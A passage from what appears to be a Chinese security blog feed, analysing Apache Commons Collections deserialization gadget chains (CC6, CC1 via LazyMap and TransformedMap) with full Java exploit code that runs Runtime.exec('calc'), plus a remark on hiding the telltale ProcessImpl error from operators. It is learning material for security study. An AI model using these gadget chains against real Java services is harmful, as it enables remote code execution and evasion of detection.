TiedMapEntry(map,”Squirt1e”);也就是说在put的时候不让他走到LazyMap#put，随后通过反射修改掉私有变量map也可以。不过也没啥大用，就图一乐。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//先放进去一个触发不了的,避免序列化的时候触发</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">claz</span><span class="token operator">=</span>TiedMapEntry<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field tiedMap<span class="token operator">=</span>claz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"map"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tiedMap<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tiedMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span>lazyMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 将factory重新赋值为lazyMap从而触发factory.transform</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>LazyMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field factory<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">serialize</span><span class="token punctuation">(</span>hashmap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打通</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824202059912.png" alt="image-20220824202059912"></p><h5 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h5><p>由于比较简单，就不调试了。</p><pre class="line-numbers language-java"><code class="language-java">HashMap#readobjectHashMap#hashTiedMapEntry#getValueLazyMap#getChainedTransformer#transformInvokerTransformer#transform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><ol><li><a href="https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0">https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0</a> 白日梦组长</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC1_LazyMap分析</title>
      <link href="/2021/12/11/cc1-lazymap/"/>
      <url>/2021/12/11/cc1-lazymap/</url>
      
        <content type="html"><![CDATA[<blockquote><p>上回讲到CC1中的TransformedMap#checksetValue调用ChainedTransformer#transform这条链子，这回学习LazyMap#get这条路。CC6也用到了LazyMap这条路，因此这条链子需要细品。</p></blockquote><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>从transform说起，上回CC1讲解到了通过ChainedTransformer链式调用从而实现RCE，我们的目的就是找谁调用ChainedTransformer#transform，如果类的实例一般都可以通过构造方法初始化，因此我们找谁调用了transform就可以了。</p><p>Find Usages，发现LazyMap#get方法调用了transform，如果map中不包含这个key，则调用；若包含，则return map.get(key)。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823132756796.png" alt="image-20220823132756796" style="zoom: 67%;" /><p>与TransformedMap相同，LazyMap也是通过decorate方法实例化自身，factory我们传chainedTransformer就可以了，至于map我们先传一个空的。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823132938918.png" alt="image-20220823132938918" style="zoom:67%;" /><p>前面不变，分析到这一步的exp为：</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//实例化LazyMap</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来找谁调用了LazyMap#get,我们可以看到AnnotationInvocationHandler#invoke调用了get，我们只需要把memberValues赋值lazyMap即可。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823135153801.png" alt="image-20220823135153801" style="zoom: 67%;" /><p>InvocationHandler接口是proxy代理实例的调用处理程序实现的一个接口，AnnotationInvocationHandler继承自InvocationHandler。简而言之我们需要通过Proxy代理AnnotationInvocationHandler的一个实例，只要这个代理调用了任意一个方法，那么就会触发AnnotationInvocationHandler#invoke，显然，这个被代理的实例的membervalue要赋值lazyMap。</p><p>为此，我们首先要实例化一个被代理的annotationInvocationHandler，接着要实例化一个annotationInvocationHandler用来把这个代理对象传进去。</p><p>链子：</p><pre class="line-numbers language-java"><code class="language-java">AnnotationInvocationHandler#readobject<span class="token function">Proxy</span><span class="token punctuation">(</span>AnnotationInvocationHandler<span class="token punctuation">)</span><span class="token punctuation">.</span>xxxAnnotationInvocationHandler#invokeLazyMap#getChainedTransformer#transformInvokerTransformer#transform<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h5><p>直接断到AnnotationInvocationHandler#invoke方法中的执行get处，</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141057434.png" alt="image-20220823141057434"  /><p>我们查看一下当前的几个重要变量。memberValues正是exp第一次实例化传入的LazyMap，var2是触发invoke的方法名称。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141307332.png" alt="image-20220823141307332"></p><p>回看AnnotationInvocationHandler#readObject，这里确实调用了entrySet()方法。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141449245.png" alt="image-20220823141449245"></p><p>跟进get方法，这里传来的key就是方法名entrySet，显然这个空map不存在这个key，因此执行transform。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141657649.png" alt="image-20220823141657649"></p><p>接着就走到了ChainedTransformer#transform链式调用InvokerTransformer从而RCE。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823141853772.png" alt="image-20220823141853772"></p><p>RCE。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142035973.png" alt="image-20220823142035973"></p><h5 id="隐藏异常日志的思考"><a href="#隐藏异常日志的思考" class="headerlink" title="隐藏异常日志的思考"></a>隐藏异常日志的思考</h5><blockquote><p>个人思考，最后也没分析出为啥。</p></blockquote><p>细心的小伙伴儿会看到exp里的Transformer数组最后多处要给new ConstantTransformer(1),这是干啥用的？</p><p>先上结论：</p><p><strong>如果不加这一句，则报错：</strong></p><p><strong>Exception in thread “main” java.lang.ClassCastException: java.lang.ProcessImpl cannot be cast to java.util.Set</strong></p><p><strong>如果加上，则报错：</strong></p><p>**Exception in thread “main” java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set **</p><p>ProcessImpl是Process抽象类的实现类，运维人员一看，这块反序列化居然会出现Process这个进程类，肯定会排查。</p><p>可以看到链式调用执行完calc弹出计算器，此时object为ProcessImpl。这是因为getRuntime.exec()实际上就是调用ProcessBuilder.start()，而processImpl是被ProcessBuilder.start()这个方法进行创建的。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142210674.png" alt="image-20220823142210674"></p><p>而显然他还要接着触发ConstantTransformer(），从而返回1。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142559561.png" alt="image-20220823142559561"></p><p>LazyMap#get返回1。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823142644704.png" alt="image-20220823142644704" style="zoom: 80%;" /><p>调试的过程中发现“Object var6 &#x3D; this.memberValues.get(var4);”get方法返回的var6居然是-1，百思不得其解。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823143749904.png" alt="image-20220823143749904" style="zoom: 80%;" /><p>而调到这里，再往下分析就直接跳到这里，报错。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823144630811.png" alt="image-20220823144630811"></p><p>往下分析到了ObjectStreamClass#invokeReadObject，可以看到动态代理调用invoke是通过ObjectStreamClass来调用的。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823145822137.png" alt="image-20220823145822137"></p><p>就是在这个方法抛出了异常。</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823150146149.png" alt="image-20220823150146149"></p><p>至于他为啥会报这个，我怀疑是该invoke方法由entrySet()触发所以会报这个错误？</p><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><ol><li><a href="https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0">https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0</a> 白日梦组长</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC1利用链分析</title>
      <link href="/2021/12/05/cc1-li-yong-lian-fen-xi/"/>
      <url>/2021/12/05/cc1-li-yong-lian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>CC1很重要，需要去深挖。</p><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>漏洞点在于InvokerTransformer类的transform方法。可以调用该函数，以反射的形式调用任意方法，造成RCE。其中input是传进来的object。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> Object <span class="token function">transform</span><span class="token punctuation">(</span>Object input<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Class <span class="token class-name">cls</span> <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Method method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>iMethodName<span class="token punctuation">,</span> iParamTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> iArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//...略</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>而iMethodName, iParamTypes, iArgs这三个参数是在构造方法中被赋值。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token function">InvokerTransformer</span><span class="token punctuation">(</span>String methodName<span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        iMethodName <span class="token operator">=</span> methodName<span class="token punctuation">;</span>        iParamTypes <span class="token operator">=</span> paramTypes<span class="token punctuation">;</span>        iArgs <span class="token operator">=</span> args<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到该构造函数是可以实例化的，而transform也是public可以被对象调用。我们通过InvokerTransformer弹计算器。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        Runtime r<span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Runtime不是可序列化类，因此后续需要通过反射调用。</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>而接下来我们要找哪个方法调用了InvokerTransformer#transform，通过IDEA的Find usages可以找到21处调用，接下来看transformedMap#checksetValue，protected类型。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> Object <span class="token function">checkSetValue</span><span class="token punctuation">(</span>Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> valueTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>而valueTransformer是在构造方法中赋值。可以看到构造方法也是protected类型，因此还要通过类中方法调用。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token function">TransformedMap</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer keyTransformer<span class="token punctuation">,</span> Transformer valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>keyTransformer <span class="token operator">=</span> keyTransformer<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>valueTransformer <span class="token operator">=</span> valueTransformer<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很容易发现InvokerTransformer#decorate进行了实例化，并且是public static类型。为了调用InvokerTransformer#transform，<strong>要令valueTransformer&#x3D;new InvokerTransformer()</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Map <span class="token function">decorate</span><span class="token punctuation">(</span>Map map<span class="token punctuation">,</span> Transformer keyTransformer<span class="token punctuation">,</span> Transformer valueTransformer<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TransformedMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> keyTransformer<span class="token punctuation">,</span> valueTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>decorate就是为了给map装饰上key和value，那么接下来我们就要找哪里调用checksetValue了。只有1处调用：AbstractInputCheckedMapDecorator.MapEntry#setValue</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">setValue</span><span class="token punctuation">(</span>Object value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    value <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">checkSetValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>parent是通过protected类型的构造方法赋值，**parent要赋值new TransformedMap()**。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">protected</span> <span class="token function">MapEntry</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry entry<span class="token punctuation">,</span> AbstractInputCheckedMapDecorator parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下来要找哪里调用了setValue方法。首先我们要知道遍历Map可以通过Map.Entry进行遍历，而其中有entry.setValue方法。</p><p>那么如何调用AbstractInputCheckedMapDecorator.MapEntry的setValue方法？</p><p>之前我们调用了decorate方法实例化TransformedMap，而TransformedMap的父类正是AbstractInputCheckedMapDecorator，如果我们遍历TransformedMap类型的Map，那么自己没有setValue方法自然就调用了父类的setValue方法，因此我们遍历TransformedMap这个类型的Map就可以了。</p><p>还要注意一点，遍历Map要保证Map不为空，不然都进不去for循环自然调用不了setValue方法。</p><p>此时的exp：</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        Runtime r<span class="token operator">=</span>Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer invokerTransformer<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span><span class="token string">"value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>Object<span class="token operator">></span> transformedMap<span class="token operator">=</span>TransformedMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span>null<span class="token punctuation">,</span>invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry entry<span class="token operator">:</span>transformedMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            entry<span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//debug调试，setValue的参数正是最后传到InvokerTransformer#transform的input，因此这里就是赋值Runtime的实例化。</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来找谁调用了setValue，我们发现AnnotationInvocationHandler的readobject直接就调用了setValue。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token 